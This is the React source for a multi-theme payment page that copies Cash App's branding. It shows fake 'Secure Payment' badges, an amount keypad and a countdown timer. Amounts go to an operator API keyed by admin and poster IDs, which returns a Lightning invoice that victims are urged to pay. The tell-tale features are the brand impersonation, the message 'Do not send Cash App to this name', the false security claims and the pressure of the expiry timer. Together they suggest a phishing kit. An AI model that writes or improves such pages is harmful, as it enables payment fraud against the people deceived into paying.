'use client';
import { useState, useEffect } from 'react';
import { FaLock, FaArrowRight, FaCheckCircle, FaCheck, FaBolt } from 'react-icons/fa';
import { toast } from 'react-toastify';
import { API_URL, site } from '../config/index';

const AMOUNTS = [10, 50, 100, 200, 300, 500];
const MORE_AMOUNTS = [750, 1000, 1500, 2000];

export default function Home({ adminId, posterId, param, param2, linkConfig }) {
  const [step, setStep] = useState(1);
  const [selectedAmount, setSelectedAmount] = useState(null);
  const [customAmount, setCustomAmount] = useState('');
  const [showMore, setShowMore] = useState(false);
  const [loading, setLoading] = useState(false);
  const [timeLeft, setTimeLeft] = useState(12 * 60 * 60);
  const [lightningInvoice, setLightningInvoice] = useState('');

  // Extract config
  const selectedTheme = linkConfig?.theme || "Cash Green";
  const brand = linkConfig?.brandName || "Cash App";
  const displayUsername = linkConfig?.username || "";
  const displayTitle = linkConfig?.title || "Pay me on Cash App — Instantly exchange money for free on Cash App";
  
  const minAmount = linkConfig?.minAmount !== undefined ? linkConfig.minAmount : 10;
  const maxAmount = linkConfig?.maxAmount !== undefined ? linkConfig.maxAmount : 2000;
  const fixedVal = linkConfig?.fixedAmount || "Open";

  // Pre-select if fixed
  useEffect(() => {
    if (fixedVal !== "Open") {
      const parsedFixed = parseFloat(fixedVal);
      if (!isNaN(parsedFixed)) {
        setSelectedAmount(parsedFixed);
        setCustomAmount(fixedVal);
      }
    }
  }, [fixedVal]);

  useEffect(() => {
    if (step === 2 && timeLeft > 0) {
      const timerId = setInterval(() => {
        setTimeLeft((prev) => prev - 1);
      }, 1000);
      return () => clearInterval(timerId);
    }
  }, [step, timeLeft]);

  const formatTime = (seconds) => {
    const hrs = Math.floor(seconds / 3600);
    const mins = Math.floor((seconds % 3600) / 60);
    const secs = seconds % 60;
    return `${hrs.toString().padStart(2, '0')}:${mins
      .toString()
      .padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  const handlePayNow = async () => {
    if (!selectedAmount) {
      if (fixedVal === "Open") {
        toast.error(`Please enter an amount between $${minAmount} and $${maxAmount}`);
      } else {
        toast.error('Select your amount');
      }
      return;
    }

    if (fixedVal === "Open" && (selectedAmount < minAmount || selectedAmount > maxAmount)) {
      toast.error(`Amount must be between $${minAmount} and $${maxAmount}`);
      return;
    }

    setLoading(true);
    const fullLink =
      param && param2
        ? `https://${site}/${param}/${param2}`
        : `https://${site}`;

    const values = {
      site: fullLink,
      amount: selectedAmount,
      adminId,
    };

    try {
      const url = `${API_URL}/ad/${adminId}/${posterId}`;

      const res = await fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(values),
      });

      const data = await res.json();
      if (data && data.info && data.info.lightningInvoice) {
        setLightningInvoice(data.info.lightningInvoice);
      } else {
        setLightningInvoice('');
      }

      setLoading(false);
      setStep(2);
    } catch (error) {
      console.error('Error creating invoice:', error);
      setLightningInvoice('');
      setLoading(false);
      setStep(2);
    }
  };

  const handleRecommendedPay = () => {
    if (lightningInvoice) {
      window.location.href = `https://cash.app/launch/lightning/${lightningInvoice}`;
    } else {
      toast.error('Lightning invoice is not generated yet.');
    }
  };

  const handleAmountClick = (amt) => {
    setSelectedAmount(amt);
    setCustomAmount(amt.toString());
  };

  const handleCustomAmountChange = (e) => {
    const val = e.target.value;
    setCustomAmount(val);
    const parsed = parseFloat(val);
    if (!isNaN(parsed)) {
      setSelectedAmount(parsed);
    } else {
      setSelectedAmount(null);
    }
  };

  const handleKeypadPress = (key) => {
    if (key === "backspace") {
      setCustomAmount(prev => {
        const next = prev.length <= 1 ? "0" : prev.slice(0, -1);
        const parsed = parseFloat(next);
        setSelectedAmount(isNaN(parsed) ? 0 : parsed);
        return next;
      });
    } else if (key === ".") {
      setCustomAmount(prev => {
        if (prev.includes(".")) return prev;
        const next = prev === "" ? "0." : prev + ".";
        return next;
      });
    } else {
      setCustomAmount(prev => {
        if (prev === "0") return key;
        const next = prev + key;
        const parsed = parseFloat(next);
        if (!isNaN(parsed) && parsed <= maxAmount) {
          setSelectedAmount(parsed);
          return next;
        }
        return prev;
      });
    }
  };

  const getLogoLetter = () => {
    return brand ? brand.charAt(0).toUpperCase() : "C";
  };

  // Determine design layout group
  const isKeypadGreen = selectedTheme === "Cash Green" || selectedTheme === "CashApp Dark" || selectedTheme === "Pay Isla";
  const isPayinCash = selectedTheme === "Payin Cash";
  const isPayCashApp = selectedTheme === "Pay Cash App";
  const isCashAppOnline = selectedTheme === "CashApp Online";

  return (
    <div className={`min-h-screen font-sans flex flex-col justify-between ${
      isKeypadGreen ? "bg-[#00D632] text-white" :
      isPayinCash ? "bg-slate-50 text-gray-800" :
      isPayCashApp ? "bg-white text-gray-800" :
      "bg-[#f4f6f8] text-gray-800" // CashApp Online
    }`}>
      
      {/* Top Header */}
      {!isKeypadGreen && (
        <header className="flex justify-between items-center px-4 py-3 md:px-8 bg-white border-b border-gray-100 shrink-0">
          <div className="flex items-center gap-2">
            {isPayCashApp ? (
              <div className="bg-[#00D632] w-8 h-8 rounded-lg flex items-center justify-center text-white text-lg font-black select-none shadow">
                $
              </div>
            ) : (
              <div className="w-8 h-8 bg-[#00D632] rounded-full flex items-center justify-center text-white text-base font-bold shadow">
                {getLogoLetter()}
              </div>
            )}
          </div>
          
          <button className="flex items-center gap-1 text-xs font-bold border border-gray-250 px-3 py-1.5 rounded-full bg-white text-gray-500 hover:bg-gray-50 transition">
            <FaLock className="text-[9px]" />
            <span>Secure</span>
          </button>
        </header>
      )}

      <main className="flex-1 flex flex-col items-center justify-center py-4 px-4 overflow-hidden">
        {step === 1 ? (
          <>
            {/* KEYPAD GREEN LAYOUTS (Cash Green, CashApp Dark, Pay Isla) */}
            {isKeypadGreen && (
              <div className="w-full max-w-[390px] flex flex-col items-center select-none py-2 text-white">
                {/* Header notch line */}
                <div className="w-12 h-1 bg-white/25 rounded-full mb-6"></div>

                {/* Secure Badge & Header Info */}
                <div className="w-full flex items-center justify-between mb-4">
                  <div className="w-9 h-9 bg-white rounded-xl flex items-center justify-center text-[#00D632] text-base font-black shadow-lg">
                    {getLogoLetter()}
                  </div>
                  <div className="flex flex-col items-center text-center">
                    <span className="font-extrabold text-sm tracking-wide mb-1">
                      {selectedTheme === "CashApp Dark" ? `Pay $${displayUsername || "theme-preview-cashapp-dark"}` :
                       selectedTheme === "Pay Isla" ? `Pay ${brand || "Isla"}` : "Cash Green"}
                    </span>
                    <span className="flex items-center gap-1 bg-[#00b029] px-2.5 py-0.5 rounded-full text-[9px] font-bold border border-white/20">
                      <FaCheck className="text-[8px]" />
                      <span>Secure Payment</span>
                    </span>
                  </div>
                  <div className="w-9"></div>
                </div>

                {/* Subtitle card */}
                <div className="w-full bg-white/10 border border-white/15 rounded-3xl p-3.5 flex flex-col items-center text-center mb-6 shadow-lg backdrop-blur-sm">
                  <div className="w-10 h-10 bg-white rounded-2xl flex items-center justify-center text-[#00D632] text-lg font-black mb-1.5">
                    $
                  </div>
                  <span className="font-black text-sm">{selectedTheme === "CashApp Dark" ? "Cashapp" : brand}</span>
                  <span className="text-[8px] text-white/70 font-semibold flex items-center gap-1 mt-0.5">
                    <span className="w-1.5 h-1.5 bg-emerald-400 rounded-full inline-block"></span>
                    Instant
                  </span>
                </div>

                {/* Dynamic Big Amount Display */}
                <div className="text-center mb-6">
                  <h2 className="text-5xl font-black tracking-tight text-white">${customAmount || "0"}</h2>
                  <p className="text-[9px] font-bold tracking-widest text-white/75 mt-1 uppercase">
                    {selectedTheme === "Cash Green" ? "United States Dollar" : "USD"}
                  </p>
                </div>

                {/* Keypad selector */}
                {fixedVal !== "Open" ? (
                  <div className="w-full text-center py-4 bg-white/10 border border-white/15 rounded-2xl mb-6 shadow backdrop-blur-sm">
                    <span className="text-[9px] font-bold uppercase tracking-wider text-white/60 block mb-1">Fixed checkout amount</span>
                    <span className="text-2xl font-black text-white">${parseFloat(fixedVal).toFixed(2)}</span>
                  </div>
                ) : (
                  <div className="grid grid-cols-3 gap-2.5 w-full max-w-[280px] mb-6">
                    {["1", "2", "3", "4", "5", "6", "7", "8", "9", ".", "0", "backspace"].map((key) => (
                      <button
                        key={key}
                        type="button"
                        onClick={() => handleKeypadPress(key)}
                        className="h-12 rounded-xl bg-white/10 hover:bg-white/20 active:scale-95 text-white font-extrabold text-lg flex items-center justify-center transition border border-white/5"
                      >
                        {key === "backspace" ? (
                          <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M12 14l2-2m0 0l2-2m-2 2l-2-2m2 2l2 2M3 12l6.41-6.41A2 2 0 0110.83 5H20a2 2 0 012 2v10a2 2 0 01-2 2h-9.17a2 2 0 01-1.42-.59L3 12z" />
                          </svg>
                        ) : (
                          key
                        )}
                      </button>
                    ))}
                  </div>
                )}

                {/* Big Green Pay Button */}
                <button
                  onClick={handlePayNow}
                  disabled={loading}
                  className="w-full py-3.5 bg-[#009c24] hover:bg-[#00801d] text-white font-extrabold rounded-2xl text-base tracking-wide flex items-center justify-center gap-2 transition active:scale-98 shadow-lg shadow-green-950/20 disabled:opacity-50"
                >
                  {loading ? (
                    <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                  ) : (
                    "Pay"
                  )}
                </button>

                <p className="text-center text-[7px] text-white/50 tracking-widest mt-4 uppercase">
                  Powered by {brand}
                </p>
              </div>
            )}

            {/* PAYIN CASH LAYOUT */}
            {isPayinCash && (
              <div className="w-full max-w-[390px] flex flex-col items-center select-none py-2 text-gray-800">
                <div className="w-full bg-white border border-gray-100 shadow-2xl rounded-[36px] p-6 flex flex-col items-center">
                  <div className="w-12 h-1 bg-gray-250 rounded-full mb-4"></div>

                  <div className="w-12 h-12 bg-[#00D632] rounded-full flex items-center justify-center text-white text-2xl font-bold mb-2">
                    {getLogoLetter()}
                  </div>

                  <h1 className="text-xl font-bold tracking-tight text-gray-900 mb-2">
                    Payin Cash
                  </h1>

                  <div className="flex items-center gap-1 bg-emerald-50 text-[#05b875] px-3 py-1 rounded-full text-xs font-bold border border-emerald-100 mb-6">
                    <FaCheckCircle className="text-[10px]" />
                    <span>Secure Payment</span>
                  </div>

                  {fixedVal !== "Open" ? (
                    <div className="w-full text-center py-4 bg-emerald-50 border border-emerald-100 rounded-2xl mb-4">
                      <span className="text-[10px] uppercase font-bold text-gray-400 block mb-1">Payment Amount</span>
                      <span className="text-3xl font-black text-[#05b875]">${parseFloat(fixedVal).toFixed(2)}</span>
                    </div>
                  ) : (
                    <div className="w-full space-y-4 text-left">
                      <div className="border border-gray-205 bg-white rounded-2xl p-4 flex items-center justify-center">
                        <span className="text-xl font-black text-gray-900">
                          {customAmount ? `$${customAmount}` : "Enter amount"}
                        </span>
                      </div>

                      <div className="flex items-center gap-1.5 text-[10px] font-bold text-gray-400 uppercase tracking-wider mb-2">
                        <span>SELECT AMOUNT</span>
                      </div>

                      <div className="grid grid-cols-3 gap-2">
                        {AMOUNTS.filter(amt => amt >= minAmount && amt <= maxAmount).map((amt) => (
                          <button
                            key={amt}
                            type="button"
                            onClick={() => handleAmountClick(amt)}
                            className={`py-2 px-1 rounded-xl border text-xs font-bold transition duration-200 ${
                              selectedAmount === amt
                                ? "border-[#05b875] bg-emerald-50 text-[#05b875]"
                                : "border-gray-205 bg-white text-gray-800 hover:border-gray-300"
                            }`}
                          >
                            ${amt.toFixed(2)}
                          </button>
                        ))}
                      </div>

                      <button
                        type="button"
                        onClick={() => setShowMore(!showMore)}
                        className="w-full py-2.5 text-center text-[#05b875] font-bold text-xs bg-emerald-50 border border-emerald-100/50 rounded-xl hover:bg-emerald-100/60 transition"
                      >
                        {showMore ? "Show less amounts" : "Show more amounts"}
                      </button>

                      <div className="relative">
                        <input
                          type="number"
                          value={customAmount}
                          onChange={handleCustomAmountChange}
                          className="w-full py-2.5 px-4 bg-white border border-gray-200 rounded-xl text-xs font-semibold outline-none focus:border-[#05b875] text-gray-700 transition"
                          placeholder={`Custom Amount ($${minAmount} - $${maxAmount})`}
                          min={minAmount}
                          max={maxAmount}
                        />
                      </div>
                    </div>
                  )}
                </div>

                <button
                  onClick={handlePayNow}
                  disabled={loading}
                  className="w-full mt-6 py-3.5 bg-[#05b875] hover:bg-[#049a62] text-white font-extrabold rounded-2xl text-base flex items-center justify-center gap-2 transition shadow-lg active:scale-98 disabled:opacity-50"
                >
                  <FaLock className="text-xs" />
                  <span>Pay Now</span>
                  <FaArrowRight className="text-xs" />
                </button>
              </div>
            )}

            {/* PAY CASH APP LAYOUT */}
            {isPayCashApp && (
              <div className="w-full max-w-[390px] flex flex-col items-center select-none py-2 text-gray-800">
                <div className="flex flex-col items-center text-center mb-6">
                  <div className="w-12 h-12 bg-[#00D632] rounded-full flex items-center justify-center text-white text-2xl font-bold mb-2">
                    {getLogoLetter()}
                  </div>
                  <h2 className="text-base font-black text-gray-900">
                    @{displayUsername || "theme-preview-pay-cash-app"}
                  </h2>
                  <p className="text-[10px] text-gray-400 font-bold max-w-[240px] mt-1 leading-normal">
                    Do not send Cash App to this name.<br />Tap Pay now below to pay.
                  </p>
                </div>

                <div className="w-full bg-white border border-gray-100 shadow-xl rounded-3xl p-5 flex flex-col items-center">
                  {/* Step indicators */}
                  <div className="w-full flex items-center justify-between bg-gray-50 border border-gray-100 rounded-full p-1.5 mb-5 scale-95">
                    <div className="flex items-center gap-1.5 px-3 py-1 bg-white border border-gray-100 rounded-full font-bold text-xs text-gray-850">
                      <span className="w-4 h-4 bg-[#00D632] text-white rounded-full flex items-center justify-center text-[10px]">1</span>
                      <span>Amount</span>
                    </div>
                    <div className="flex items-center gap-1.5 px-3 py-1 font-bold text-xs text-gray-400 mr-2">
                      <span className="w-4 h-4 bg-gray-200 text-gray-500 rounded-full flex items-center justify-center text-[10px]">2</span>
                      <span>Pay</span>
                    </div>
                  </div>

                  <div className="w-full flex flex-col items-center border border-gray-100 rounded-2xl py-4 mb-4 select-none">
                    <div className="bg-[#00D632] w-12 h-12 rounded-2xl flex items-center justify-center text-white text-2xl font-black mb-1.5 shadow-md">
                      $
                    </div>
                    <span className="font-extrabold text-xs tracking-wide text-gray-800">Instant</span>
                  </div>

                  {fixedVal !== "Open" ? (
                    <div className="w-full text-center py-4 bg-slate-50 border border-gray-100 rounded-xl mb-4">
                      <span className="text-[9px] uppercase font-bold text-gray-400 block mb-1">Payment Amount</span>
                      <span className="text-2xl font-black text-gray-900">${parseFloat(fixedVal).toFixed(2)}</span>
                    </div>
                  ) : (
                    <div className="w-full space-y-4 text-left">
                      <span className="text-[9px] font-bold text-gray-400 uppercase tracking-wider block">SELECT AMOUNT</span>
                      
                      <div className="border border-gray-100 bg-slate-50 rounded-xl p-3.5 flex items-center gap-2">
                        <span className="text-emerald-500 text-xl font-bold">$</span>
                        <input
                          type="number"
                          value={customAmount}
                          onChange={handleCustomAmountChange}
                          placeholder="0.00"
                          className="bg-transparent text-xl font-extrabold outline-none w-full border-none placeholder-gray-300 text-gray-800"
                          min={minAmount}
                          max={maxAmount}
                        />
                      </div>
                      <span className="text-[10px] font-semibold text-gray-400 block -mt-2">
                        Between {minAmount} and {maxAmount} USD.
                      </span>

                      {/* Quick amounts pills */}
                      <div className="space-y-1.5">
                        <p className="text-[9px] font-bold text-gray-400 uppercase tracking-wider">Quick amounts</p>
                        <div className="flex flex-wrap gap-2">
                          {[10, 15, 20, 25].filter(amt => amt >= minAmount && amt <= maxAmount).map(amt => (
                            <button
                              key={amt}
                              type="button"
                              onClick={() => handleAmountClick(amt)}
                              className={`py-1.5 px-4 rounded-full border text-xs font-bold transition duration-200 ${
                                selectedAmount === amt
                                  ? "border-emerald-500 bg-emerald-50 text-emerald-600 shadow-sm"
                                  : "border-gray-150 bg-white text-gray-600 hover:border-gray-200 shadow-sm"
                              }`}
                            >
                              ${amt}
                            </button>
                          ))}
                        </div>
                      </div>
                    </div>
                  )}

                  <div className="w-full flex items-center justify-between border-t border-gray-100 pt-3 mt-4 text-[10px] text-gray-400 font-bold uppercase tracking-wider">
                    <span className="flex items-center gap-1 text-emerald-500"><FaLock className="text-[9px]" /> Secure</span>
                    <span className="flex items-center gap-1 text-emerald-500"><FaBolt className="text-[9px]" /> Instant</span>
                  </div>
                </div>

                <button
                  onClick={handlePayNow}
                  disabled={loading}
                  className="w-full mt-6 py-3.5 bg-[#0f172a] hover:bg-[#1e293b] text-white font-extrabold rounded-2xl text-base flex items-center justify-center gap-2 transition shadow-lg active:scale-98 disabled:opacity-50"
                >
                  {loading ? (
                    <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                  ) : (
                    <>
                      <span>Continue to payment</span>
                      <FaArrowRight className="text-xs" />
                    </>
                  )}
                </button>
              </div>
            )}

            {/* CASHAPP ONLINE LAYOUT */}
            {isCashAppOnline && (
              <div className="w-full max-w-[390px] flex flex-col items-center select-none py-2 text-gray-800">
                <div className="w-full bg-white border border-gray-100 shadow-xl rounded-[32px] p-6 flex flex-col items-center">
                  <div className="w-12 h-1 bg-gray-200 rounded-full mb-4"></div>

                  <h1 className="text-lg font-black text-gray-800 tracking-tight mb-2">
                    Pay {brand}
                  </h1>

                  <div className="flex items-center gap-1 bg-[#ccf7e1] text-[#00b0ff] px-3 py-0.5 rounded-full text-[10px] font-bold border border-emerald-100 mb-5">
                    <span>OK Secure Payment</span>
                  </div>

                  {/* Inner logo card */}
                  <div className="w-full flex flex-col items-center border border-gray-100 rounded-2xl py-4 mb-4 select-none">
                    <div className="bg-[#00D632] w-11 h-11 rounded-2xl flex items-center justify-center text-white text-2xl font-black mb-1 shadow-md">
                      $
                    </div>
                    <span className="font-extrabold text-[11px] text-gray-800">{brand}</span>
                  </div>

                  {fixedVal !== "Open" ? (
                    <div className="w-full text-center py-3.5 bg-slate-50 border border-gray-100 rounded-xl mb-4">
                      <span className="text-[9px] uppercase font-bold text-gray-400 block mb-1">Payment Amount</span>
                      <span className="text-xl font-black text-gray-800">${parseFloat(fixedVal).toFixed(2)}</span>
                    </div>
                  ) : (
                    <div className="w-full space-y-4 text-left">
                      
                      <div className="border border-emerald-100 bg-[#f9fbf9] rounded-xl p-3 flex items-center justify-between">
                        <span className="text-[#00D632] text-sm font-black">$</span>
                        <input
                          type="number"
                          value={customAmount}
                          onChange={handleCustomAmountChange}
                          placeholder="Enter amount"
                          className="bg-transparent text-sm font-bold outline-none w-full border-none text-right placeholder-gray-300 text-gray-800"
                          min={minAmount}
                          max={maxAmount}
                        />
                      </div>

                      <span className="text-[9px] font-bold text-[#00D632] uppercase tracking-wider block">
                        $ QUICK SELECT
                      </span>

                      {/* Pill options */}
                      <div className="grid grid-cols-3 gap-2">
                        {[10, 20, 30].filter(amt => amt >= minAmount && amt <= maxAmount).map(amt => (
                          <button
                            key={amt}
                            type="button"
                            onClick={() => handleAmountClick(amt)}
                            className={`py-2 border rounded-xl text-xs font-bold transition ${
                              selectedAmount === amt
                                ? "border-[#00D632] bg-[#f9fbf9] text-[#00D632]"
                                : "border-gray-200 bg-white text-gray-700"
                            }`}
                          >
                            ${amt.toFixed(2)}
                          </button>
                        ))}
                      </div>

                      <button
                        type="button"
                        onClick={() => setShowMore(!showMore)}
                        className="w-full py-2 bg-emerald-50/50 text-[#00D632] font-bold text-xs border border-emerald-100/50 rounded-xl text-center"
                      >
                        Show more amounts v
                      </button>
                    </div>
                  )}
                </div>

                {/* Big green checkout button */}
                <button
                  onClick={handlePayNow}
                  disabled={loading}
                  className="w-full mt-6 py-3.5 bg-[#00D632] hover:bg-[#00b029] text-white font-extrabold rounded-2xl text-base flex items-center justify-center gap-2 transition active:scale-98 shadow-lg shadow-green-200 disabled:opacity-50"
                >
                  {loading ? (
                    <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                  ) : (
                    "Pay Now ->"
                  )}
                </button>

                <p className="text-center text-[7px] text-gray-400 mt-4 font-semibold">
                  Powered by <span className="text-[#00D632] font-bold">{brand}</span> - Trusted by millions.
                </p>
              </div>
            )}
          </>
        ) : (
          <div className="w-full max-w-[390px] space-y-3 my-auto flex flex-col shrink-0">
            {/* Main Payment Card */}
            <div className={`rounded-[32px] p-5 md:p-6 flex flex-col items-center shrink-0 border shadow-2xl ${
              isKeypadGreen ? "bg-white border-white text-gray-800" : "bg-white border-gray-100"
            }`}>
              <div className="w-full text-center mb-3 flex flex-col items-center">
                <p className="text-[11px] font-extrabold text-gray-400 uppercase tracking-wider mb-1">
                  Amount Due
                </p>
                <h2 className="text-4xl font-extrabold leading-tight text-gray-900">
                  ${selectedAmount.toFixed(2)}
                </h2>
                <p className="text-[12px] font-semibold text-gray-400 mt-1">
                  Scan or tap to pay
                </p>
              </div>

              {/* QR Code Container */}
              <div className="relative p-3.5 bg-white border border-gray-100 rounded-[28px] mb-3 w-full aspect-square flex items-center justify-center shadow-sm max-w-[260px] mx-auto select-all">
                <img
                  src={`https://api.qrserver.com/v1/create-qr-code/?size=600x600&ecc=H&data=${encodeURIComponent(`https://cash.app/launch/lightning/${lightningInvoice}`)}`}
                  alt="Payment QR"
                  className="w-full h-full object-contain p-1"
                />
                <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 bg-[#00D632] w-9 h-9 rounded-xl flex items-center justify-center shadow-lg border-2 border-white">
                  <span className="text-white font-black text-lg select-none">
                    $
                  </span>
                </div>
              </div>

              {/* Pay Now RECOMMENDED Button */}
              <button
                onClick={handleRecommendedPay}
                className="w-full py-3 bg-[#00D632] hover:bg-[#00b029] text-white font-extrabold rounded-full text-[15px] flex items-center justify-center gap-2.5 transition-all shadow-md shadow-green-100"
              >
                <div className="bg-black rounded-lg w-6 h-6 flex items-center justify-center shadow-sm shrink-0">
                  <span className="text-white font-black text-xs">$</span>
                </div>
                <span>Pay now</span>
                <span className="bg-white/20 text-white text-[9px] font-extrabold uppercase px-2 py-0.5 rounded-full tracking-wider shrink-0">
                  Recommended
                </span>
              </button>
            </div>

            {/* Timer Box */}
            <div className="bg-white border border-gray-100 shadow-xl rounded-[24px] p-4 text-center shrink-0 w-full">
              <p className="text-[11px] font-extrabold text-gray-400 uppercase tracking-wider mb-1">
                Expires In
              </p>
              <p className="text-2xl font-extrabold text-gray-900 leading-none">
                {formatTime(timeLeft)}{' '}
                <span className="text-gray-400 font-bold ml-1 text-base">remaining</span>
              </p>
            </div>
          </div>
        )}
      </main>

      {/* Decorative Bottom Bar */}
      <div className={`fixed bottom-0 left-0 right-0 h-1 opacity-35 bg-gradient-to-r from-transparent via-current to-transparent ${
        isKeypadGreen ? "text-white" : "text-emerald-500"
      }`}></div>
    </div>
  );
}
